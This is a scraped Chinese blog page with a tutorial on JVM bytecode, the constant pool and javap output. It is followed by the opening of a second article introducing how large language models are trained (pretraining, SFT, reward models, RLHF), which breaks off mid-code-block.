<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E4%B8%8E%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%85%B3%E7%B3%BB" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E4%B8%8E%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%85%B3%E7%B3%BB">字节码与常量池的关系</a></li>
<li><a href="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%AE%9E%E9%99%85%E5%86%85%E5%AE%B9%E4%B8%8E%E5%BC%95%E7%94%A8" title="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%AE%9E%E9%99%85%E5%86%85%E5%AE%B9%E4%B8%8E%E5%BC%95%E7%94%A8">常量池的实际内容与引用</a></li>
</ul>
</li>
<li><a href="#%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4javap-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90" title="#%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4javap-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90">实用工具与命令：javap 深度解析</a>
<ul>
<li><a href="#javap-%E7%9A%84%E5%AE%98%E6%96%B9%E8%AF%B4%E6%98%8E" title="#javap-%E7%9A%84%E5%AE%98%E6%96%B9%E8%AF%B4%E6%98%8E">javap 的官方说明</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8-javap-%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%8F%82%E6%95%B0" title="#%E5%B8%B8%E7%94%A8-javap-%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%8F%82%E6%95%B0">常用 javap 命令与参数</a></li>
<li><a href="#javap-%E8%BE%93%E5%87%BA%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90" title="#javap-%E8%BE%93%E5%87%BA%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">javap 输出详解与案例分析</a></li>
</ul>
</li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%96%91%E9%97%AE%E4%B8%8E%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90" title="#%E5%B8%B8%E8%A7%81%E7%96%91%E9%97%AE%E4%B8%8E%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90">常见疑问与深入解析</a></li>
<li><a href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%85%A8%E6%B5%81%E7%A8%8B%E8%BF%BD%E8%B8%AA" title="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%85%A8%E6%B5%81%E7%A8%8B%E8%BF%BD%E8%B8%AA">实战案例：从源码到字节码的全流程追踪</a></li>
<li><a href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E5%BB%BA%E8%AE%AE" title="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E5%BB%BA%E8%AE%AE">总结与学习建议</a></li>
<li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" title="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">前言</h3>
<p>在深入学习 Java 虚拟机（JVM）和 JDK 工具的过程中，理解字节、字节码、常量池以及 JVM 的栈式架构，是掌握 Java 性能调优、底层原理和排查复杂问题的基础。本文结合实际学习过程、工具输出和常见疑问，系统梳理相关知识点，帮助你建立从源码到字节码再到 JVM 执行的完整认知链路。</p>
<hr/>
<h3 data-id="heading-3">Java 虚拟机架构与执行模型</h3>
<h4 data-id="heading-4">JVM 的整体架构</h4>
<p>JVM 主要包括以下几个核心组件：</p>
<ul>
<li><strong>类加载子系统</strong>：负责加载、验证、准备、解析和初始化类。</li>
<li><strong>运行时数据区</strong>：包括方法区、堆、虚拟机栈、本地方法栈、程序计数器等。</li>
<li><strong>执行引擎</strong>：负责字节码的解释执行或即时编译（JIT）。</li>
<li><strong>本地方法接口</strong>：与本地（C/C++）库交互。</li>
</ul>
<h4 data-id="heading-5">基于栈的执行引擎</h4>
<p>JVM 的指令集是**基于栈（Stack-based）**的，而不是基于寄存器。其特点：</p>
<ul>
<li>所有操作都围绕操作数栈（Operand Stack）进行。</li>
<li>指令通常是“弹出操作数、执行操作、结果入栈”。</li>
<li>这样设计的好处是跨平台性强，指令集简单，便于解释执行。</li>
</ul>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;
</code></pre>
<p>对应字节码：</p>
<pre><code class="hljs language-arduino" lang="arduino">iload_1   <span class="hljs-comment">// 将 a 压入栈</span>
iload_2   <span class="hljs-comment">// 将 b 压入栈</span>
iadd      <span class="hljs-comment">// 弹出 a、b，相加后结果入栈</span>
istore_3  <span class="hljs-comment">// 弹出结果，存入 c</span>
</code></pre>
<h4 data-id="heading-6">JVM 的内存结构</h4>
<ul>
<li><strong>操作数栈</strong>：每个方法执行时都有独立的操作数栈，临时存放计算过程中的数据。</li>
<li><strong>局部变量表</strong>：存放方法参数和局部变量。</li>
<li><strong>堆</strong>：存放对象实例。</li>
<li><strong>方法区</strong>：存放类元数据、常量池、静态变量等。</li>
</ul>
<hr/>
<h3 data-id="heading-7">基础概念：比特、字节与字节码</h3>
<h4 data-id="heading-8">比特（bit）与字节（byte）</h4>
<ul>
<li><strong>比特（bit）</strong>：最小的数据单位，0 或 1。</li>
<li><strong>字节（byte）</strong>：8 个比特组成，计算机最小的寻址单位。</li>
</ul>
<p><strong>为什么用字节而不是比特？</strong></p>
<ul>
<li>现代计算机硬件和操作系统以字节为最小寻址单位，便于存储和读取。</li>
</ul>
<h4 data-id="heading-9">字节码（Bytecode）</h4>
<ul>
<li>Java 源码编译后生成的 <code>.class</code> 文件即为字节码文件。</li>
<li>字节码是一种中间代码，JVM 解释或 JIT 编译后执行。</li>
</ul>
<h4 data-id="heading-10">字节码文件结构</h4>
<p><code>.class</code> 文件结构包括：</p>
<ul>
<li>魔数（Magic Number）</li>
<li>版本号</li>
<li><strong>常量池（Constant Pool）</strong></li>
<li>访问标志</li>
<li>类/父类信息</li>
<li>字段表</li>
<li>方法表</li>
<li>属性表</li>
</ul>
<hr/>
<h3 data-id="heading-11">JVM 字节码的执行流程</h3>
<h4 data-id="heading-12">字节码指令的格式</h4>
<ul>
<li>每条指令由 1 字节操作码（opcode）+ 若干操作数（operand）组成。</li>
<li>指令长度不一，导致字节码偏移量（offset）不连续。</li>
</ul>
<h4 data-id="heading-13">操作数栈与局部变量表</h4>
<ul>
<li><strong>操作数栈</strong>：方法执行时用于临时存放数据和操作结果。</li>
<li><strong>局部变量表</strong>：存放方法参数和局部变量，按索引访问。</li>
</ul>
<h4 data-id="heading-14">字节码执行的实际例子</h4>
<p><strong>Java 代码：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
    <span class="hljs-keyword">return</span> a + b;
}
</code></pre>
<p><strong>javap -c -v 输出：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">0: iload_1</span>
<span class="hljs-section">1: iload_2</span>
<span class="hljs-section">2: iadd</span>
<span class="hljs-section">3: ireturn</span>
</code></pre>
<ul>
<li><code>iload_1</code>：将第 1 个本地变量（a）加载到操作数栈</li>
<li><code>iload_2</code>：将第 2 个本地变量（b）加载到操作数栈</li>
<li><code>iadd</code>：弹出栈顶两个 int 相加，结果入栈</li>
<li><code>ireturn</code>：返回 int 类型结果</li>
</ul>
<hr/>
<h3 data-id="heading-15">常量池机制详解</h3>
<h4 data-id="heading-16">常量池的作用与类型</h4>
<ul>
<li>常量池是 <code>.class</code> 文件中的一张“表”，存储类、方法、字段的符号引用、字符串字面量、数值常量等。</li>
<li>常量池项类型包括：
<ul>
<li><code>CONSTANT_Class</code>：类或接口引用</li>
<li><code>CONSTANT_Fieldref</code>：字段引用</li>
<li><code>CONSTANT_Methodref</code>：方法引用</li>
<li><code>CONSTANT_String</code>：字符串字面量</li>
<li><code>CONSTANT_Integer</code>、<code>CONSTANT_Float</code>、<code>CONSTANT_Long</code>、<code>CONSTANT_Double</code>：数值常量</li>
<li><code>CONSTANT_NameAndType</code>：名称和描述符</li>
</ul>
</li>
</ul>
<h4 data-id="heading-17">字节码与常量池的关系</h4>
<ul>
<li>字节码指令如 <code>ldc #2</code>、<code>invokevirtual #5</code> 等，后面的数字是常量池的索引。</li>
<li>JVM 通过常量池索引找到实际的类名、方法名、字符串等信息，实现符号引用到直接引用的转换。</li>
</ul>
<h4 data-id="heading-18">常量池的实际内容与引用</h4>
<p><strong>javap -v 输出示例：</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Constant</span> <span class="hljs-selector-tag">pool</span>:
   <span class="hljs-selector-id">#1</span> = <span class="hljs-selector-tag">Methodref</span>          <span class="hljs-selector-id">#2</span>.<span class="hljs-selector-id">#3</span>         <span class="hljs-comment">// java/lang/Object."&lt;init&gt;":()V</span>
   <span class="hljs-selector-id">#2</span> = <span class="hljs-selector-tag">Class</span>              <span class="hljs-selector-id">#4</span>            <span class="hljs-comment">// java/lang/Object</span>
   <span class="hljs-selector-id">#3</span> = <span class="hljs-selector-tag">NameAndType</span>        <span class="hljs-selector-id">#5</span>:<span class="hljs-selector-id">#6</span>         <span class="hljs-comment">// "&lt;init&gt;":()V</span>
   <span class="hljs-selector-id">#4</span> = <span class="hljs-selector-tag">Utf8</span>               <span class="hljs-selector-tag">java</span>/<span class="hljs-selector-tag">lang</span>/<span class="hljs-selector-tag">Object</span>
   <span class="hljs-selector-id">#5</span> = <span class="hljs-selector-tag">Utf8</span>               &lt;<span class="hljs-selector-tag">init</span>&gt;
   <span class="hljs-selector-id">#6</span> = <span class="hljs-selector-tag">Utf8</span>               ()<span class="hljs-selector-tag">V</span>
</code></pre>
<ul>
<li><code>#1</code> 是方法引用，指向 <code>#2</code>（类）和 <code>#3</code>（名称和类型）。</li>
<li><code>#4</code>、<code>#5</code>、<code>#6</code> 是 UTF-8 字符串。</li>
</ul>
<hr/>
<h3 data-id="heading-19">实用工具与命令：javap 深度解析</h3>
<h4 data-id="heading-20">javap 的官方说明</h4>
<blockquote>
<p>javap - disassemble one or more class files</p>
</blockquote>
<p><code>javap</code> 是 JDK 自带的字节码反编译工具，可用于分析 <code>.class</code> 文件结构、字节码指令和常量池内容。</p>
<h4 data-id="heading-21">常用 javap 命令与参数</h4>
<ul>
<li><code>javap -c 类名</code>：反编译字节码</li>
<li><code>javap -v 类名</code>：显示详细信息，包括常量池</li>
<li><code>javap -c -v 类名</code>：同时显示字节码和常量池</li>
<li><code>javap -l 类名</code>：显示行号和本地变量表</li>
<li><code>javap -s 类名</code>：显示方法签名</li>
</ul>
<h4 data-id="heading-22">javap 输出详解与案例分析</h4>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello, JVM!"</span>;
        System.out.println(s);
    }
}
</code></pre>
<p><strong>javap -c -v Demo 输出片段：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">public</span> <span class="hljs-string">static</span> <span class="hljs-string">void</span> <span class="hljs-string">main(java.lang.String[]);</span>
  <span class="hljs-attr">Code:</span>
     <span class="hljs-attr">0:</span> <span class="hljs-string">ldc</span>           <span class="hljs-comment">#2                  // String Hello, JVM!</span>
     <span class="hljs-attr">2:</span> <span class="hljs-string">astore_1</span>
     <span class="hljs-attr">3:</span> <span class="hljs-string">getstatic</span>     <span class="hljs-comment">#3                  // Field java/lang/System.out:Ljava/io/PrintStream;</span>
     <span class="hljs-attr">6:</span> <span class="hljs-string">aload_1</span>
     <span class="hljs-attr">7:</span> <span class="hljs-string">invokevirtual</span> <span class="hljs-comment">#4                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span>
    <span class="hljs-attr">10:</span> <span class="hljs-string">return</span>
</code></pre>
<ul>
<li><code>ldc #2</code>：将常量池第 2 项（字符串）加载到栈</li>
<li><code>getstatic #3</code>：获取常量池第 3 项（System.out）</li>
<li><code>invokevirtual #4</code>：调用常量池第 4 项的方法（println）</li>
</ul>
<hr/>
<h3 data-id="heading-23">常见疑问与深入解析</h3>
<h4 data-id="heading-24">1. 为什么 JVM 采用基于栈的架构？</h4>
<ul>
<li>跨平台性强，指令集简单，便于解释执行。</li>
<li>不依赖底层硬件寄存器，适合多种 CPU 架构。</li>
</ul>
<h4 data-id="heading-25">2. 字节码偏移量为什么不是连续的？</h4>
<ul>
<li>每条指令长度不同，偏移量表示指令在字节流中的起始位置，非连续是正常现象。</li>
</ul>
<h4 data-id="heading-26">3. 为什么用字节（byte）而不是比特（bit）存储？</h4>
<ul>
<li>计算机硬件和操作系统以字节为最小寻址单位，便于存储和读取。</li>
</ul>
<h4 data-id="heading-27">4. 常量池和字节码的关系是什么？</h4>
<ul>
<li>字节码通过常量池索引间接引用类、方法、字段、字符串等，常量池是字节码的“字典”。</li>
</ul>
<h4 data-id="heading-28">5. 如何通过 javap 追踪源码到字节码的映射？</h4>
<ul>
<li>使用 <code>javap -c -l</code> 可查看字节码与源码行号、本地变量表的对应关系，便于调试和性能分析。</li>
</ul>
<hr/>
<h3 data-id="heading-29">实战案例：从源码到字节码的全流程追踪</h3>
<p><strong>1. 编写 Java 源码</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a + b;
    }
}
</code></pre>
<p><strong>2. 编译生成 .class 文件</strong></p>
<pre><code class="hljs language-shell" lang="shell">javac Calculator.java
</code></pre>
<p><strong>3. 使用 javap 分析字节码</strong></p>
<pre><code class="hljs language-shell" lang="shell">javap -c -v Calculator
</code></pre>
<p><strong>4. 结合常量池和字节码理解执行流程</strong></p>
<ul>
<li>通过 <code>iload_1</code>、<code>iload_2</code>、<code>iadd</code>、<code>ireturn</code> 理解加法的栈式执行过程。</li>
<li>通过 <code>ldc #n</code>、<code>invokevirtual #n</code> 理解常量池引用的解码过程。</li>
</ul>
<hr/>
<h3 data-id="heading-30">总结与学习建议</h3>
<ul>
<li>JVM 的栈式架构和字节码执行机制是 Java 跨平台和高安全性的基础。</li>
<li>常量池机制极大提升了符号引用的灵活性和运行时效率。</li>
<li>掌握 <code>javap</code> 等工具，有助于源码级调试、性能分析和底层原理学习。</li>
<li>建议多结合实际代码、工具输出和官方文档，反复实践、深入理解。</li>
</ul>
<hr/>
<h3 data-id="heading-31">参考资料</h3>
<ul>
<li>《深入理解 Java 虚拟机》</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fjavase%2Fspecs%2Fjvms%2Fse17%2Fhtml%2Findex.html" target="_blank" title="https://docs.oracle.com/javase/specs/jvms/se17/html/index.html" ref="nofollow noopener noreferrer">The Java® Virtual Machine Specification</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fen%2Fjava%2Fjavase%2F17%2Fdocs%2Fspecs%2Fman%2Fjavap.html" target="_blank" title="https://docs.oracle.com/en/java/javase/17/docs/specs/man/javap.html" ref="nofollow noopener noreferrer">JDK 官方文档 - javap</a></li>
</ul>
<hr/>
<p>如需进一步探讨，欢迎留言交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大语言模型是怎么训练出来的？一篇入门指南]]></title>    <link>https://juejin.cn/post/7575112613778702370</link>    <guid>https://juejin.cn/post/7575112613778702370</guid>    <pubDate>2025-11-23T22:11:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613778702370" data-draft-id="7575162322241011712" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大语言模型是怎么训练出来的？一篇入门指南"/> <meta itemprop="keywords" content="LLM,机器学习"/> <meta itemprop="datePublished" content="2025-11-23T22:11:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大语言模型是怎么训练出来的？一篇入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T22:11:50.000Z" title="Sun Nov 23 2025 22:11:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ChatGPT、Claude这些大模型到底是怎么训练出来的？看着它们能写文章、写代码、回答问题，背后的训练过程其实也没那么神秘。今天就用最直白的方式聊聊这个流程。</p>
<h2 data-id="heading-0">整体流程长啥样</h2>
<p>大模型训练可以分成四个主要阶段，每个阶段解决不同的问题。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[海量文本数据] --&gt; B[预训练 Pre-training]
    B --&gt; C[基座模型 Base Model]
    C --&gt; D[监督微调 SFT]
    D --&gt; E[指令微调模型]
    E --&gt; F[训练奖励模型 RM]
    F --&gt; G[强化学习 RLHF]
    G --&gt; H[最终产品模型]
    
    style B fill:#667eea,color:#fff
    style D fill:#764ba2,color:#fff
    style F fill:#f093fb,color:#fff
    style G fill:#4facfe,color:#fff
</code></pre>
<p>简单来说就是：</p>
<ol>
<li>预训练 - 让模型学会"说话"</li>
<li>微调 - 教它怎么做事</li>
<li>奖励建模 - 告诉它什么是好的回答</li>
<li>强化学习 - 让它自己优化</li>
</ol>
<p>听起来挺清楚的对吧？但每个阶段都有不少门道。</p>
<h2 data-id="heading-1">第一步：预训练（Pre-training）</h2>
<p>预训练就是让模型看海量的文本，自己学习语言规律。这个阶段模型会学习词汇、语法、常识，甚至一些推理能力。</p>
<h3 data-id="heading-2">数据规模有多大？</h3>
<p>看看几个主流模型的训练数据量：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[GPT-3&lt;br/&gt;300B tokens] --&gt; B[LLaMA&lt;br/&gt;1.4T tokens]
    B --&gt; C[LLaMA 2&lt;br/&gt;2T tokens]
    C --&gt; D[LLaMA 3&lt;br/&gt;15T tokens]
    
    style A fill:#e8f4f8
    style B fill:#d1e7f0
    style C fill:#b8dae8
    style D fill:#9fcde0
</code></pre>
<p>15万亿个token是什么概念？大概相当于7500万本书。数据量越大，模型学到的知识就越丰富。</p>
<h3 data-id="heading-3">训练目标：预测下一个词</h3>
<p>预训练的核心思想很简单：给模型一句话的前半部分，让它预测下一个词是什么。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 预训练的本质</span>
input_text = <span class="hljs-string">"今天天气真"</span>
<span class="hljs-comment"># 模型要预测：好 / 差 / 冷 / 热 ...</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">next_token_prediction</span>(<span class="hljs-params">context</span>):
    <span class="hljs-comment"># 计算每个可能词的概率</span>
    probabilities = model(context)
    next_token = argmax(probabilities)
    <span class="hljs-keyword">return</span> next_token
</code></pre>
<p>通过不断预测下一个词，模型逐渐学会了语言的规律。这个过程不需要人工标注，完全是自监督学习。</p>
<h3 data-id="heading-4">训练成本</h3>
<p>预训练的成本是整个训练过程中最高的。LLaMA 3训练花了几亿人民币，用了几千张GPU跑了几个月。</p>
<h2 data-id="heading-5">第二步：监督微调（SFT）</h2>
<p>预训练完之后，模型虽然学会了语言，但还不知道怎么正确回答问题。这时候就需要微调。</p>
<h3 data-id="heading-6">微调在做什么？</h3>
<p>给模型准备一些标准的问答对，教它怎么回答各种问题。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># SFT的训练数据格式</span>
training_data = [
    {
        <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"请解释什么是机器学习"</span>,
        <span class="hljs-string">"response"</span>: <span class="hljs-string">"机器学习是一种让计算机从数据中学习模式的技术..."</span>
    },
    {
        <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"用Python写一个冒泡排序"</span>,
        <span class="hljs-string">"response"</span>: <span class="hljs-string">"def bubble_sort(arr):\n    n = len(arr)\n    ..."</span>
    }
]

<span class="hljs-comment"># 训练时的目标</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sft_loss</span>(<span class="hljs-params">model, instruction, response</span>):
    predicted = model(instruction)
    <span class="hljs-comment"># 让模型输出尽可能接近标准答案</span>
    loss = cross_entropy(predicted, response)
    <span class="hljs-keyword">return</span> loss
</code></pre>
<h3 data-id="heading-7">数据量对比</h3>
<p>预训练用了万亿级别的数据，但微调只需要几十万条高质量的问答对。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">pie title 训练数据量对比
    "预训练数据" : 99.9
    "微调数据" : 0.1
</code></pre>
<p>为什么差这么多？因为预训练学的是语言的通用能力，而微调学的是具体任务的格式。就像学会了中文，再学怎么写文章就快多了。</p>
<h3 data-id="heading-8">几个要注意的地方</h3>
<ol>
<li>
<p><strong>数据质量很重要</strong>：100条高质量数据比1000条低质量数据效果好得多。高质量意味着回答准确、完整、有结构。</p>
</li>
<li>
<p><strong>任务多样性</strong>：要覆盖问答、总结、代码、翻译各种场景，不能只训练一种任务。</p>
</li>
<li>
<p><strong>格式统一</strong>：最好有清晰的模板，比如统一用"问题+回答"的格式。</p>
</li>
</ol>
<h2 data-id="heading-9">第三步：训练奖励模型（RM）</h2>
<p>这一步是训练流程中比较巧妙的设计。</p>
<h3 data-id="heading-10">为什么需要奖励模型？</h3>
<p>同一个问题可能有多个好答案，也有很多不好的答案。怎么让模型知道哪个答案更好？</p>
<p>直接打分太主观了，所以就训练一个专门的奖励模型来评判答案的质量。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[同一个问题] --&gt; B[答案A]
    A --&gt; C[答案B]
    A --&gt; D[答案C]
    
    B --&gt; E[人类标注:&lt;br/&gt;A &gt; C &gt; B]
    C --&gt; E
    D --&gt; E
    
    E --&gt; F[训练奖励模型]
    F --&gt; G[可以给任何答案打分]
    
    style E fill:#f093fb,color:#fff
    style F fill:#667eea,color:#fff
</code></pre>
<h3 data-id="heading-11">怎么训练奖励模型？</h3>
<p>核心是收集人类的偏好数据。给标注员看两个答案，让他选哪个更好。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 奖励模型的训练</span>
